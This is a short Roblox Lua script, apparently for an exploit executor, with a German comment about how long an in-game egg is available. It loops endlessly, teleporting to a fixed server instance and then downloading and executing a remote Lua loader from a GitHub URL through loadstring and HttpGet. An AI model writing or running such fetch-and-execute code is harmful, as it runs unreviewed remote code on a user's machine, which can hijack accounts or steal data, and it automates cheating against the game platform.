-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 10

while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "9d0b04f0-d10b-433f-ba75-83748bb126d2")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
